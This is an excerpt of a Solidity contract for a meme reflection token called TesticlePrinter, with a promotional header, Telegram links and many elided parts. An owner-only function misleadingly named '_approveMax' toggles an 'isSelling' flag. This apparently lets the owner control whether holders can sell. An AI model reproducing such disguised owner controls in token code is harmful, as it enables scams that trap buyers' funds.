...
HODL $SPERM TO GET $OHM REFLECTIONS


📢 https://t.me/TesticlePrinter
📢https://t.me/testiculeprinterchat
*/
...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 EP = IBEP20(0xc6d605D42936d9361900Ac8987986DDE654F395E); 
...
contract TesticlePrinter is IBEP20, Auth {
    using SafeMath for uint256;

    uint256 public constant MASK = type(uint128).max;
    address EP = 0xc6d605D42936d9361900Ac8987986DDE654F395E; 
    address public WAVAX = 0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "TesticlePrinter";
    ...
    address public autoLiquidityReceiver=0xe816c84eEc615e5aADda05bE2Ad49a69a1c58FD7;
    address public marketingFeeReceiver=0xe816c84eEc615e5aADda05bE2Ad49a69a1c58FD7;
    ...
    function _approveMax(bool value) external onlyOwner {
        isSelling = value;
    }
